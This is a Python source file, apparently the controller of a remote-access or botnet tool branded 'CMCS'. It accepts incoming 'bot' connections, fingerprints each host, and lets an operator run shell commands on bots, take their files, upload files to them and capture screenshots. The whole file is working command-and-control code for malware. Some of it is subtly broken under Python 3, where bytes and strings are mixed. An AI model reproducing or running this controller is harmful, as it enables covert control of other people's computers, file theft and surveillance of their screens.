#!/usr/bin/python3
# -*- coding: utf-8 -*-
import socket
import os
from threading import Thread
from prettytable import PrettyTable
from colorama import Fore, Style
import time
import sys



server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

if len(sys.argv) != 3:
    print ("Correct usage: script <IP address> <port number>")
    exit()

IP_address = str(sys.argv[1])
Port = int(sys.argv[2])

server.bind((IP_address, Port))
server.listen(50)



list_of_clientsocket = []
list_of_clientaddr = []

flag=True

imageno=1
bottable = PrettyTable(['INDEX','IP','PORT','OS','HOSTNAME','ARCH','VERSION'])



def session(conn):

	print ("\n \n")
	print ("==========================")
	print ("CONNECTED TO THE CLIENT")
	print ("==========================") 
	print (Fore.YELLOW)
	print ("PRESS HELP FOR INSTRUCTIONS")
	print (Style.RESET_ALL)
	print ("\n")

	while True:
		command=input("client>")
		if 'exit' in command:
			print ("\n BACK TO MOTHERSHIP \n")
			return

		elif 'grab*' in command:
			try:
				transfergrab(conn,command)
			except:
				conn.close()
				remove(conn)
				return

		elif 'upload*' in command:
			try:
				transferupload(conn,command)
			except:
				conn.close()
				remove(conn)
				return
		elif 'cd*' in command:
			try:
				conn.send(command)
				shell=conn.recv(1024)
				while True:
					print (shell)
					if shell.endswith("DONE"):
						break
					shell=conn.recv(1024)
			except:
				conn.close()
				remove(conn)
				return

		elif 'screenshot' in command:
			try:
				screenshot(conn,command)
			except:
				conn.close()
				remove(conn)
				return
		elif 'shell*' in command:
			try:
				conn.send(command.encode())

				shell=conn.recv(1024).decode()
				if shell.startswith("COMMAND_NOT_FOUND"):
					print("command not found")
				else:
					while True:
						print (shell)
						if shell.endswith("DONE"):
							break
						shell=conn.recv(1024).decode()
			except:
				conn.close()
				remove(conn)
				return
		elif 'help' in command:
			helpbot()
		elif 'status' in command:
			clientstatus(conn,command)
		else:
			print("INVALID COMMAND PRESS HELP FOR MORE INFO")




def remove(connection):
    
    if connection in list_of_clientsocket:
        x=list_of_clientsocket.index(connection)
        list_of_clientsocket.pop(x)
        print(Fore.RED)
        print ("[-] client disconnected " + list_of_clientaddr[x][0] + "\n")
        print(Style.RESET_ALL)
        list_of_clientaddr.pop(x)




def mothership():
    global flag
    while True:
        command=input("<mothership>")
      

        if 'showbots' in command:
            x=showbots()
            while x != 0:
                x=showbots()


        elif "connect" in command:
            a,b=command.split(" ")
            b=int(b)
            if b<len(list_of_clientaddr):
                session(list_of_clientsocket[b])
            else:
                print(Fore.RED)
                print("[-]index out of range TRY AGAIN (indexing starts from 0)")
                print(Style.RESET_ALL)

        elif "exit" in command:

            quitsafely()
        elif "help" in command:
            helpmothership()

        else:
            print("INVALID COMMAND PRESS HELP FOR MORE INFO")

def showbots():

	bottable.clear_rows()
	for x in range(len(list_of_clientsocket)):
		try:
			list_of_clientsocket[x].send('os'.encode())
			clientinfo=list_of_clientsocket[x].recv(1024)
			if clientinfo=='':
				return 1
			clientinfo=clientinfo.decode()
			clientinfo=clientinfo.split('$')
		except:
			list_of_clientsocket[x].close()
			remove(list_of_clientsocket[x])
			return 1
		table=[x,list_of_clientaddr[x][0],list_of_clientaddr[x][1]]
		table.extend(clientinfo)
		bottable.add_row(table)

	print ("CURRENTLY CONNECTED BOTS")
	print ("----------------------------")    
	print (bottable)
	return 0


def clientstatus(conn,command):
	conn.send(command.encode())
	data=conn.recv(1024)
	data=data.decode()
	data=data.split('$')
	osdetailslist=data[0:6]
	memorylist=data[6:10]
	swaplist=data[10:12]
	cpulist=data[12:14]
	osdetailstable = PrettyTable(['Os','Hostname','Arch','Version','Boot Date','Boot Time'])
	memorytable = PrettyTable(['Total Memory','Available Memory','Used Memory','Percent Use'])
	swaptable = PrettyTable(['Total Swap','Free Swap'])
	cputable = PrettyTable(['Current Clock Speed','CPU %'])

	osdetailstable.add_row(osdetailslist)
	memorytable.add_row(memorylist)
	swaptable.add_row(swaplist)
	cputable.add_row(cpulist)

	print("OS DETAILS")
	print(osdetailstable)
	print("MEMORY STATUS")
	print(memorytable)
	print("SWAP STATUS")
	print(swaptable)
	print("CPU STATUS")
	print(cputable)


def botconnect():
 
    global flag
    while flag:
         
        conn, addr = server.accept()
        list_of_clientsocket.append(conn)
        list_of_clientaddr.append(addr)
        if flag==True:
            print(Fore.GREEN)
            print("\n [+] incoming connection " + addr[0] + " connected")       
            print(Style.RESET_ALL)
       
        
          

def screenshot(conn,command):
    global imageno
    conn.send(command)
    
    filename="screenshot"+str(imageno)+".jpg"
    path=os.getcwd()+"/"
    path += filename
    
    f=open(path,'wb+')
    while True:
        bits=conn.recv(1024)
        f.write(bits)
                
        if bits.endswith('DONE'):
            
            print(Fore.GREEN)
            print("[+]screenshot saved at "+ path)   
            print(Style.RESET_ALL)
       
            
            f.close()
            break
    
    imageno+=1

def transfergrab(conn,command):
	conn.send(command.encode())
	grab,filename=command.split('*')
	path=os.getcwd()+"/"
	path += filename
	bits=conn.recv(1024)
	msg=bits.decode()
	if "The File Doesn't Exist" in msg:

		print(Fore.RED)
		print("[-]The File Doesn't Exist")   
		print(Style.RESET_ALL)
	elif "DIR" in msg:
		print(Fore.YELLOW)
		print("[-]Cannot grab a Directory")
		print(Style.RESET_ALL)
	elif "ERROR" in msg:
		print(Fore.RED)
		print("[-]Some error occured at remote host")
		print(Style.RESET_ALL)

	else:
		f=open(path,'wb+')
		while True:
				f.write(bits)
				bits=conn.recv(1024)
				msg=bits.decode()
				if "DONE" in msg:
					print(Fore.GREEN)
					print("[+]File Transfer Complete")   
					print(Style.RESET_ALL)
					f.close()
					break




def transferupload(conn,command):
    print(Fore.YELLOW)
    print("[+] YOU HAVE INVOKED THE UPLOAD COMMAND")
    print("[+] THE FILE MUST BE IN YOUR CURRENT WORKING DIRECTORY")
    print(Style.RESET_ALL)
    upload,fname=command.split('*')
    if os.path.exists(fname):
        
        conn.send(command)
        print(Fore.BLUE)
        print("[+]UPLOADING")
        print(Style.RESET_ALL)
        
        f=open(fname,'rb')
        f.seek(0)
        packet=f.read(1024)
        while packet!='':
            conn.send(packet)
            packet=f.read(1024)
        conn.send("DONE")
        f.close()
        print(Fore.GREEN)
        print("[+]UPLOAD SUCCESSFULL")
        print(Style.RESET_ALL)
    else:
        print(Fore.RED)
        print("[-]The File Doesn't Exist")
        print(Style.RESET_ALL)
        
        
        
def quitsafely():
    global flag
    ans=input("\n ARE YOU SURE?(Y/N) ")
    if ans=='y' or ans=='Y':
        flag = False
        
        for conn in list_of_clientsocket:
            
            
            conn.send("SLEEP".encode())
            x=list_of_clientsocket.index(conn)
            print ("going to sleep "+list_of_clientaddr[x][0] )
            conn.close()
                
        print(Fore.GREEN)
        print("\n --------------------------------------------------------------------------")
        print("ALL BOTS ARE SLEEPING IT IS SAFE TO QUIT/EXIT NOW.")
        print("EXITING IN 10 SECONDS")
        print(" --------------------------------------------------------------------------")
        print(Style.RESET_ALL)
        
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((str(sys.argv[1]),int(sys.argv[2])))
        
        print(Fore.RED)
        for remaining in range(10, 0, -1):
            sys.stdout.write("\r")
            sys.stdout.write("{:2d} seconds remaining.".format(remaining)) 
            sys.stdout.flush()
            time.sleep(1)
        print(Style.RESET_ALL)
        
        
        
        
        exit()
        sys.exit()
            
        
     
    else:
        return
        
        
        
        
        

def graphics():


	print("\n\n\n")
	print(Fore.GREEN)
	print('''		 ██████╗███╗   ███╗ ██████╗███████╗
		██╔════╝████╗ ████║██╔════╝██╔════╝
		██║     ██╔████╔██║██║     ███████╗
		██║     ██║╚██╔╝██║██║     ╚════██║
		╚██████╗██║ ╚═╝ ██║╚██████╗███████║
	 	╚═════╝╚═╝     ╚═╝ ╚═════╝╚══════╝
     		Centralised Monitoring And Control System
     		A framework Purely in Python''')
	print(Fore.YELLOW)
	print('''   	  ___   _      ___   _      ___   _      ___   _      ___   _
	 [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|    [(_)] |=|
	  '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|     '-`  |_|
	 /mmm/  /     /mmm/  /     /mmm/  /     /mmm/  /     /mmm/  /
	       |____________|____________|____________|____________|
	                             |            |            |
	                         ___  \_      ___  \_      ___  \_
	                        [(_)] |=|    [(_)] |=|    [(_)] |=|
	                         '-`  |_|     '-`  |_|     '-`  |_|
	                        /mmm/        /mmm/        /mmm/''')
	print("		Enter Help For Instructions")
	print(Style.RESET_ALL)
	print("\n \n \n  ")
def helpmothership():
    
    
    print("+----------------+--------------------------------------+")
    print("|     COMMAND    | DESCRIPTION                          |")
    print("+----------------+--------------------------------------+")
    print("| showbots       | display table of connected bots      |")
    print("+----------------+--------------------------------------+")
    print("| connect <index>| connect to bot at a specified index  |")
    print("+----------------+--------------------------------------+")
    print("| exit           |exit the application(bots go to sleep)|")
    print("+----------------+--------------------------------------+")
    print("| help           | see this table                       |")
    print("+----------------+--------------------------------------+")  
    print("\n")

def helpbot():
    
    print("+-------------------+--------------------------------------------------------+")
    print("|      COMMAND      | DESCRIPTION                                            |")
    print("+-------------------+--------------------------------------------------------+")
    print("|        exit       | back to mothership(stay connected to the bot)          |")
    print("+-------------------+--------------------------------------------------------+")
    print("|        help       | see this table                                         |")
    print("+-------------------+--------------------------------------------------------+")
    print("|     screenshot    | take a screenshot of bot and save to cwd of mothership |")
    print("+-------------------+--------------------------------------------------------+")
    print("|  shell*<command>  | execute a shell command on bot                         |")
    print("+-------------------+--------------------------------------------------------+")
    print("|  grab*<file_name> | transfer a file from cwd of bot to cwd of mothership   |")
    print("+-------------------+--------------------------------------------------------+")
    print("| upload*<filename> | transfer a file from cwd of mothership to cwd of bot   |")
    print("+-------------------+--------------------------------------------------------+")
    print("|     cd*<path>     | change cwd of bot                                      |")
    print("+-------------------+--------------------------------------------------------+")
    
    







t1 = Thread(target = botconnect)

graphics()
t1.start()
mothership()






